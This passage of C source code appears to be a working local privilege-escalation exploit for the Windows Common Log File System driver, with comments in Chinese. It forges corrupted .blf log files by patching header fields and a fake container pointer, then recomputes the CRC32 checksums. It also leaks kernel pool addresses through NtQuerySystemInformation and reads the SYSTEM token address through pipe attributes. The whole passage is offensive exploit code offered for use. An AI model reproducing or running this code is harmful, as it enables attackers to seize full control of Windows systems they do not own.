	_NtFsControlFile(hReadPipe[0], 0, 0, 0, &ioStatusBlock, 0x110038, &inBuf, 2, outBuf, bufSize);

	return 1;

}




DWORD64 GetSystemToken(DWORD64 processOffset)
{
	DWORD64 tokenAddress = 0;

	PCHAR buf = (PCHAR) malloc(0x2000);
	if (!buf)
	{
		PLOG("[+] Allocate memory fail (%s)\n", __FUNCTION__);
		return 0;
	}
	memset(buf, 0x41, 0x2000);

	//读取管道属性值
	if (ReadPipeArbitraryValue(buf, 0x2000))
	{
		tokenAddress = *(DWORD64*)(buf + processOffset + 0x4b8);  //页面地址 + 内核对象的页面偏移 + token偏移		
	}

	if (!buf)
		free(buf);

	return tokenAddress;

}

void DestoryPipeArbitrary()
{

	if (hReadPipe[0])
		CloseHandle(hReadPipe[0]);


	if (hReadPipe[1])
		CloseHandle(hReadPipe[1]);

	if (attribute)
	{
		free(attribute);
	}

}

//****************************************************
//日志文件构造


//代码执行日志文件名
WCHAR logName[] = L"LOG:.\\MyLog";   //日志名
WCHAR logFileName[] = L".\\MyLog.blf";   //日志文件名
WCHAR containerFileName[] = L".\\.container_1";  //容器文件名


//漏洞触发日志文件
WCHAR logName2[10][30] = 
	{ L"LOG:.\\MyLog0",L"LOG:.\\MyLog1" ,L"LOG:.\\MyLog2" ,L"LOG:.\\MyLog3" ,L"LOG:.\\MyLog4" ,
	L"LOG:.\\MyLog5" ,L"LOG:.\\MyLog6" ,L"LOG:.\\MyLog7" ,L"LOG:.\\MyLog8" ,L"LOG:.\\MyLog9"};
WCHAR logFileName2[10][30] = 
	{ L".\\MyLog0.blf" ,L".\\MyLog1.blf" ,L".\\MyLog2.blf" ,L".\\MyLog3.blf" ,L".\\MyLog4.blf" ,
	L".\\MyLog5.blf" ,L".\\MyLog6.blf" ,L".\\MyLog7.blf" ,L".\\MyLog8.blf" ,L".\\MyLog9.blf" };
WCHAR containerFileName2[10][30] = 
	{L".\\.container_0",L".\\.container_1",L".\\.container_2",L".\\.container_3",L".\\.container_4",
	L".\\.container_5",L".\\.container_6",L".\\.container_7",L".\\.container_8",L".\\.container_9"};



//创建触发漏洞的日志文件，该日志文件用于修改代码执行日志文件
int CreateTriggerVulnerabilityLogFile(int index)
{

	int result = 1;  //函数返回值
	ULONGLONG cSize = 512;  //容器文件大小
	HANDLE ha = INVALID_HANDLE_VALUE, hb= INVALID_HANDLE_VALUE;  //句柄
	DWORD NumberOfBytesRead;   //实际读取的字节
	DWORD NumberOfBytesWritten;  //实际写入的字节
	DWORD tmp;
	DWORD containerAddress;
	DWORD containerOffset;
	int logBockSize = 0x7A00;  //通用日志块的大小
	PULONG buf = 0; //缓冲区指针

	uint32_t checksum = 0;  //通用日志块的校验和


	// 创建日志文件
	hb = CreateLogFile(logName2[index], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
	
	if (hb == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Create log file1 failed\n ");
		goto fail;
	}
	CloseHandle(hb);



	
	//创建影子块
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for copy shadow \n ");
		goto fail;
	}
	SetFilePointer(ha, 0, 0, 0);   //第一个通用日志块

	buf = (PULONG)malloc(0x401);
	
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for copy shadow \n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x400u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for copy shadow \n ");
		goto fail;
	}
	CloseHandle(ha);


	buf[3] = 0;  //原始checksum置0
	//buf[0x1C] = 0x1C;  //harBaseRecord
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, 0x400);  //计算crc32
	buf[3] = checksum;



	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for copy shadow \n ");
		goto fail;
	}
	SetFilePointer(ha, 0x400u, 0, 0u);
	if (!WriteFile(ha, buf, 0x400u, &NumberOfBytesRead, 0))
	{
		PLOG("[-]copy shadow to log file failed\n ");
		goto fail;
	}

	CloseHandle(ha);

	
	//修改VaildSectorCount
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 1;
	SetFilePointer(ha, 6, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 2u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);
	

	//修改hdrControlRecord 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 2;
	SetFilePointer(ha, 0x70, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改eExtendState
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 2;
	SetFilePointer(ha, 0x84, 0, 0u);  // 设置eExtendState=2
	if (!WriteFile(ha, &tmp, 1u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	//修改iExtendBlock
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 4;
	SetFilePointer(ha, 0x88, 0, 0u);  // 设置iExtendBlock
	if (!WriteFile(ha, &tmp, 2u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改iFlushBlock
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 4;
	SetFilePointer(ha, 0x8A, 0, 0u);  // 设置iFlushBlock
	if (!WriteFile(ha, &tmp, 2u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	
	/*
	//修改cExtendStartSectors 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 1;
	SetFilePointer(ha, 0x90, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改cExtendSecotrs 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 3;
	SetFilePointer(ha, 0x94, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp,4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改cClient 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 2;
	SetFilePointer(ha, 0x9c, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 1u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	*/

	//修改eExtendState 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 2;
	SetFilePointer(ha, 0x484, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 1u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改iExtendBlock 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 0x13;
	SetFilePointer(ha, 0x488, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 1u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//修改iFlushBlock 
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 0x13;
	SetFilePointer(ha, 0x48A, 0, 1u);  // 设置
	if (!WriteFile(ha, &tmp, 1u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);
	

	//修改cbSymbolZone
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 0x65C8;
	SetFilePointer(ha, 0x1B98, 0, 0u);  // 设置cbSymbolZone
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	//修改cbSymbolZone
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 0x65C8;
	SetFilePointer(ha, 0x9598, 0, 0u);  // 设置cbSymbolZone
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	//计算crc32校验和
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0, 0, 0u);   //第一个通用日志块

	buf = (PULONG)malloc(0x401);
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x400u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, 0x400);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0xC, 0, 0u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	CloseHandle(ha);




	//计算crc32校验和
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0, 0, 0u);   //第一个通用日志块

	buf = (PULONG)malloc(0x401);
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x400u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, 0x400);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0xC, 0, 0u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	CloseHandle(ha);//计算crc32校验和
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x400, 0,0u);   //第一个通用日志块

	buf = (PULONG)malloc(0x401);
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x400u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, 0x400);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x40C, 0, 0u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	CloseHandle(ha);



	//计算crc32校验和
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x800, 0, 0u);   //第一个通用日志块

	buf = (PULONG)malloc(0x7A01);
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x7A00u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, logBockSize);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x80C, 0, 0u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	CloseHandle(ha);


	//计算crc32校验和
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x8200, 0, 0u);   //第一个通用日志块

	buf = (PULONG)malloc(0x7A01);
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x7A00u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, logBockSize);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName2[index], 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x820C, 0, 0u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	//CloseHandle(ha);

	/*
	//漏洞触发测试
	printf("\nCreateLogFile modified file\n");
	getchar();
	hb = CreateLogFile(logName2[index], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);

	if (hb == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Create log file2 failed\n ");
		goto fail;
	}
	

	printf("Add log container");
	getchar();
	// 添加容器
	if (!AddLogContainer(hb, &cSize, containerFileName, 0))
	{
		PLOG("[-] Add log container failed\n ");
		goto fail;
	}

	

	//关闭日志文件句柄
	CloseHandle(hb);
	*/

	result = 0;

fail:
	if (INVALID_HANDLE_VALUE != ha)
		CloseHandle(ha);

	//if (INVALID_HANDLE_VALUE != hb)
		//CloseHandle(hb);


	if (buf)
		free(buf);

	return result;







}



//最终触发代码执行的日志文件
int CreateCodeExecuteLogFile()
{

	int result = 1;  //函数返回值
	ULONGLONG cSize = 512;  //容器文件大小
	HANDLE ha = INVALID_HANDLE_VALUE;  //句柄
	DWORD NumberOfBytesRead;   //实际读取的字节
	DWORD NumberOfBytesWritten;  //实际写入的字节
	DWORD tmp;
	DWORD containerAddress;
	DWORD containerOffset;
	int logBockSize = 0x7A00;  //通用日志块的大小
	PULONG buf = 0; //缓冲区指针

	uint32_t checksum = 0;  //通用日志块的校验和


	// 创建日志文件
	ha = CreateLogFile(logName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Create log file failed\n ");
		goto fail;
	}


	// 添加容器
	if (!AddLogContainer(ha, &cSize, containerFileName, 0))
	{
		PLOG("[-] Add log container failed\n ");
		goto fail;
	}

	//关闭日志文件句柄
	CloseHandle(ha);


	//获取容器偏移
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for get cotainer offset\n ");
		goto fail;
	}
	SetFilePointer(ha, 0xB98, 0, 1u);   //容器偏移数组

	if (!ReadFile(ha, &containerOffset, 4, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}

	CloseHandle(ha);


	//修改RecordOffset[12]
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write SignaturesOffset\n ");
		goto fail;
	}
	tmp = 0x369;
	SetFilePointer(ha, 0x858, 0, 1u);  // 设置BaseBlock.RecordOffset[12]=0x369
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write SignaturesOffset to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//计算修正后的容器地址
	containerAddress = containerOffset + 0x870 + 0x100;

	//新增容器前面的数据(指向容器名)
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);    //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-]Open log file failed for write cidQueue\n ");
		goto fail;
	}

	tmp = containerOffset + 0x30 + 0x100;
	SetFilePointer(ha, containerAddress -0x10, 0, 1u);
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))  
	{
		PLOG("[-] Write cidQueue to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	//新增容器前面的数据(指向容器)
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);    //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-]Open log file failed for write cidQueue\n ");
		goto fail;
	}
	SetFilePointer(ha, containerAddress - 0x10 + 0x4 , 0, 1u);  //容器地址-C的值要等于容器偏移
	containerOffset += 0x100;
	if (!WriteFile(ha, &containerOffset, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write cidQueue to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//新增容器类型
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);    //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-]Open log file failed for write cidQueue\n ");
		goto fail;
	}
	tmp = 0xC1FDF008;
	SetFilePointer(ha, containerAddress, 0, 1u);
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write cidQueue to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);

	//新增容器节点
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);    //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-]Open log file failed for write cidQueue\n ");
		goto fail;
	}
	tmp = 0x30;
	SetFilePointer(ha, containerAddress + 0x4, 0, 1u);
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))
	{
		PLOG("[-] Write cidQueue to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);
	

	//新增pContainer
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0); //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for write pContainer\n ");
		goto fail;
	}
	tmp = 0x5000000;
	SetFilePointer(ha, containerAddress + 0x18 , 0, 1u);  //设置文件偏移到pContainer
	if (!WriteFile(ha, &tmp, 4u, &NumberOfBytesWritten, 0))  //SignaturesOffset的位置  = pContainer偏移
	{
		PLOG("[-] Write pContainer to log file failed\n ");
		goto fail;
	}
	CloseHandle(ha);


	//计算crc32校验和
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);  //打开blf文件
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for calculate crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x800, 0, 1u);   //第一个通用日志块

	buf = (PULONG)malloc(0x7A01);  
	if (!buf)
	{
		PLOG("[-] Allocate memory failed for calculate crc32\n ");
		goto fail;
	}

	if (!ReadFile(ha, buf, 0x7A00u, &NumberOfBytesRead, 0))  //读取通用块数据
	{
		PLOG("[-] Read block failed for calculate crc32\n ");
		goto fail;
	}
	CloseHandle(ha);

	buf[3] = 0;  //原始checksum置0
	checksum = crc_compute_crc32_ext(CRC32_InitalValue, (PUCHAR)buf, logBockSize);  //计算crc32

	//写入crc32
	ha = CreateFileW(logFileName, 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-] Open log file failed for overwriter crc32\n ");
		goto fail;
	}
	SetFilePointer(ha, 0x80C, 0, 1u);
	if (!WriteFile(ha, &checksum, 4u, &NumberOfBytesRead, 0))
	{
		PLOG("[-] Overwriter crc32 to log file failed\n ");
		goto fail;
	}

	//CloseHandle(ha);

	result = 0;

fail:
	if (INVALID_HANDLE_VALUE != ha)
		CloseHandle(ha);

	if (buf)
		free(buf);

	return result;




}


PVOID* PBASE_BLOCK_ADDRESS_BUF = 0;
//基本块查询 (获取新打开的日志文件的基本块地址)
int GetBaseBlockPtr(int flag, PVOID* pBaseBlock)
{
	int result = 1;
	UINT64* outBuf = 0;
	ULONG retlen = 0;
	ULONG bufSize = 0;
	DWORD* bigPoolInformationBuf = 0;
	IO_STATUS_BLOCK ioStatusBlock;
	NTSTATUS status = STATUS_SUCCESS;
	int num = 0;
	PVOID* temp = 0;

	//基本块属性标记
	UINT BASE_BLOCK_TAG = 0x73666c43; //Clfs	

	//申请内存
	bufSize = 0x1000;
	bigPoolInformationBuf = (DWORD*)VirtualAlloc(0, bufSize, 0x1000, 4);
	if (!bigPoolInformationBuf)
	{
		PLOG("[-](GetBaseBlockPtr) Allocate big pool information buffer fail\n");
		goto fail;
	}

	//查询大池对象信息
	fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolInformationBuf, 0x1000, &retlen);

	//释放内存
	VirtualFree(bigPoolInformationBuf, bufSize, 0x1000);

	bufSize = retlen;
	//申请内存
	bigPoolInformationBuf = (DWORD*)VirtualAlloc(0, (SIZE_T)bufSize, 0x1000, 4);
	if (!bigPoolInformationBuf)
	{
		PLOG("[-](GetBaseBlockPtr) Second allocate big pool information buffer fail\n");
		goto fail;
	}

	//	fnNtQuerySystemInformation(SystemBigPoolInformation, v5a, retlen2, &retlen2);


	// find Attribute Tag inside the Pool
	//再次查询

	if (NT_SUCCESS(status = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolInformationBuf, retlen, &retlen))) {

		//大池信息结构
		PSYSTEM_BIGPOOL_INFORMATION pBuf = (PSYSTEM_BIGPOOL_INFORMATION)(bigPoolInformationBuf);


		if (flag == 0)
		{
			//获取CreateLogFile前CLFS的0x7a00大小池地址

			//遍历SYSTEM_BIGPOOL_ENTRY数组
			for (ULONG i = 0; i < pBuf->Count; i++) {
				__try {


					if (pBuf->AllocatedInfo[i].TagUlong == BASE_BLOCK_TAG && pBuf->AllocatedInfo[i].SizeInBytes == 0x7A00) {  //定位到基本块的标记					
						//计算clfs的基本块池数量
						num++;
						//PLOG("[+] VirtualAddress -->%p\tTag --> %s\tSize --> 0x%x\n", pBuf->AllocatedInfo[i].VirtualAddress, 
						//	&pBuf->AllocatedInfo[i].TagUlong, 
						//	pBuf->AllocatedInfo[i].SizeInBytes);

					}
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {

				}
			}

			//申请内存
			size_t allocSize = (num + 1) * sizeof(PVOID);
			PBASE_BLOCK_ADDRESS_BUF = (PVOID*)malloc(allocSize);
			if (!PBASE_BLOCK_ADDRESS_BUF)
			{
				PLOG("[-](GetBaseBlockPtr) Allocate base block address buffer fail\n");
				goto fail;
			}

			memset(PBASE_BLOCK_ADDRESS_BUF, 0, allocSize);
			temp = PBASE_BLOCK_ADDRESS_BUF;

			//遍历SYSTEM_BIGPOOL_ENTRY数组
			for (ULONG i = 0; i < pBuf->Count; i++) {
				__try {


					if (pBuf->AllocatedInfo[i].TagUlong == BASE_BLOCK_TAG && pBuf->AllocatedInfo[i].SizeInBytes == 0x7A00) {  //定位到基本块的标记					
						//赋值
						*temp++ = pBuf->AllocatedInfo[i].VirtualAddress;
						PLOG("[+](GetBaseBlockPtr) VirtualAddress -->%p\tTag --> %s\tSize --> 0x%x\n", 
							pBuf->AllocatedInfo[i].VirtualAddress,
							&pBuf->AllocatedInfo[i].TagUlong,
							pBuf->AllocatedInfo[i].SizeInBytes);

					}
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {

				}
			}
		}
		else
		{

			//使用CreateLogFile后的CLFS的0x7a00大小池地址与之前的获取的进行比较，查询到新增的地址，即CreateLogFile的基本块地址
			for (ULONG i = 0; i < pBuf->Count; i++) {
				__try {

					//属性判断
					if (pBuf->AllocatedInfo[i].TagUlong == BASE_BLOCK_TAG && pBuf->AllocatedInfo[i].SizeInBytes == 0x7A00) {  //定位到基本块的标记					

						temp = PBASE_BLOCK_ADDRESS_BUF;
						num = 0;

						//遍历初始查询地址
						while (*temp != 0)
						{
							//检测到重复值
							if (*temp == pBuf->AllocatedInfo[i].VirtualAddress)
							{
								num = 1;
								break;
							}
							temp++;
						}

						//遍历结束后，未检测到重复值
						if (!num)
						{
							//写出数据
							*pBaseBlock = pBuf->AllocatedInfo[i].VirtualAddress;
							PLOG("[+](GetBaseBlockPtr) pBaseBlock: %p\n",*pBaseBlock);
							//break;
						}

					}
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {

				}
			}

		}
	}
	else
	{
		PLOG("[-](GetBaseBlockPtr) fnNtQuerySystemInformation fail\n");
		goto fail;
	}

	result = 0;

fail:


	if (outBuf)
	{
		free(outBuf);
	}

	if (bigPoolInformationBuf)
	{
		VirtualFree(bigPoolInformationBuf, bufSize, 0x1000);
	}

	//释放第一次申请的内存
	if (flag && PBASE_BLOCK_ADDRESS_BUF)
	{
		free(PBASE_BLOCK_ADDRESS_BUF);

	}

	return result;


}




//****************************************************
//构造池布局
